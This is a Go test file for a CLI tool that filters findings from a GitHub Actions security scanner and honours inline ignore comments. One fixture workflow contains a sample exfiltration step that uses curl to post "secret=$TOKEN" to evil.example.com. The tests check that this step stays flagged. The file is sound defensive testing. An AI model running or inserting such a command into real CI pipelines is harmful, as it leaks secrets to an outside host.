//go:build !integration

package cli

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

const inlineIgnoreWorkflow = `
name: Inline Ignore
on:
  workflow_dispatch:
jobs:
  agent:
    runs-on: ubuntu-latest
    steps:
      - name: Public index request
        run: |
          set -euo pipefail
          # runner-guard:ignore RGS-012 -- public unauthenticated GET; no secrets are sent.
          curl -fsS https://models.dev/api.json -o api.json
      - name: Suspicious request
        run: |
          curl -fsS https://evil.example.com/collect -d "secret=$TOKEN"
`

func TestFilterRunnerGuardIgnoredFindings(t *testing.T) {
	t.Parallel()
	gitRoot := t.TempDir()
	writeWorkflow(t, gitRoot, "inline-ignore.lock.yml", inlineIgnoreWorkflow)

	findings := []runnerGuardFinding{
		// Line 9 is the generated step boundary; the inline ignore is in the same run block.
		{RuleID: "RGS-012", File: "inline-ignore.lock.yml", Line: 9},
		{RuleID: "RGS-012", File: ".github/workflows/inline-ignore.lock.yml", Line: 16},
		{RuleID: "RGS-005", File: "inline-ignore.lock.yml", Line: 9},
	}

	filtered := filterRunnerGuardIgnoredFindings(findings, gitRoot)

	require.Len(t, filtered, 2)
	assert.Equal(t, 16, filtered[0].Line)
	assert.Equal(t, "RGS-005", filtered[1].RuleID)
}

func TestFilterGeneratedSafeOutputPermissionFindings(t *testing.T) {
	t.Parallel()
	gitRoot := t.TempDir()
	writeWorkflow(t, gitRoot, "generated.lock.yml", "# To regenerate this workflow, run:\n#   gh aw compile\njobs:\n  safe_outputs:\n")
	writeWorkflow(t, gitRoot, "user-workflow.yml", "jobs:\n  safe_outputs:\n")

	findings := []runnerGuardFinding{
		{RuleID: "RGS-005", File: "generated.lock.yml", JobID: "activation"},
		{RuleID: "RGS-005", File: "generated.lock.yml", JobID: "agent"},
		{RuleID: "RGS-005", File: "user-workflow.yml", JobID: "safe_outputs"},
		{RuleID: "RGS-012", File: "generated.lock.yml", JobID: "safe_outputs"},
	}

	filtered := filterGeneratedSafeOutputPermissionFindings(findings, gitRoot)

	require.Len(t, filtered, 3)
	assert.Equal(t, "agent", filtered[0].JobID)
	assert.Equal(t, "user-workflow.yml", filtered[1].File)
	assert.Equal(t, "RGS-012", filtered[2].RuleID)
}

func TestHasRunnerGuardInlineIgnore(t *testing.T) {
	t.Parallel()
	lines := []string{
		"      - name: Public index request", // 1
		"        run: |",                     // 2
		"          # runner-guard:ignore RGS-012 -- public unauthenticated GET; no secrets sent.", // 3
		"          curl -fsS https://models.dev/api.json -o api.json",                             // 4
	}

	assert.True(t, hasRunnerGuardInlineIgnore(lines, 1, "RGS-012"))
	assert.True(t, hasRunnerGuardInlineIgnore(lines, 4, "RGS-012"))
	assert.False(t, hasRunnerGuardInlineIgnore(lines, 1, "RGS-005"))
	assert.False(t, hasRunnerGuardInlineIgnore(lines, 100, "RGS-012"))
	assert.False(t, hasRunnerGuardInlineIgnore(nil, 1, "RGS-012"))
}

func TestHasRunnerGuardInlineIgnoreAllowsNearbyGeneratedLineOffsets(t *testing.T) {
	t.Parallel()
	lines := []string{
		"      - name: Configure host",                      // 1
		"        run: |",                                    // 2
		"          GH_HOST=github.com",                      // 3
		"      - name: Fetch provider models",               // 4
		"        run: |",                                    // 5
		"          set -euo pipefail",                       // 6
		"          OUT=/tmp/models",                         // 7
		"          mkdir -p \"$OUT\"",                       // 8
		"          provider=example",                        // 9
		"          endpoint=https://api.example.com/models", // 10
		"          cache=/tmp/models/cache.json",            // 11
		"          if [ -z \"$TOKEN\" ]; then",              // 12
		"            exit 0",                                // 13
		"          fi",                                      // 14
		"          echo fetching",                           // 15
		"          : > \"$cache\"",                          // 16
		"          test -n \"$endpoint\"",                   // 17
		"          # runner-guard:ignore RGS-012 -- official provider endpoint.", // 18
		"          curl -fsS https://api.example.com/models",                     // 19
	}

	// Line 3 simulates runner-guard attributing a finding to a generated setup line 15 lines
	// before the inline suppression comment that justifies the provider request.
	assert.True(t, hasRunnerGuardInlineIgnore(lines, 3, "RGS-012"))
}

func TestHasRunnerGuardInlineIgnoreAllowsHelperFunctionBodyOffset(t *testing.T) {
	t.Parallel()
	lines := make([]string, 0, 30)
	lines = append(lines,
		"      - name: Verify raw GitHub remote MCP handshake", // 1
		"        env:", // 2
		"          GITHUB_MCP_SERVER_TOKEN: ${{ secrets.TOKEN }}", // 3
		"        run: |",              // 4
		"          set -euo pipefail", // 5
	)
	for i := 0; i < 22; i++ {
		lines = append(lines, "          # setup line")
	}
	lines = append(lines,
		"          # runner-guard:ignore RGS-012 -- pinned request to the official endpoint; no data is exfiltrated.",
		"          curl -fsS https://api.example.com",
	)

	// The finding is reported on the step's `- name:` line (line 1), 28 lines before the
	// inline-ignore comment that sits next to the actual curl call inside a helper function.
	assert.True(t, hasRunnerGuardInlineIgnore(lines, 1, "RGS-012"))
}
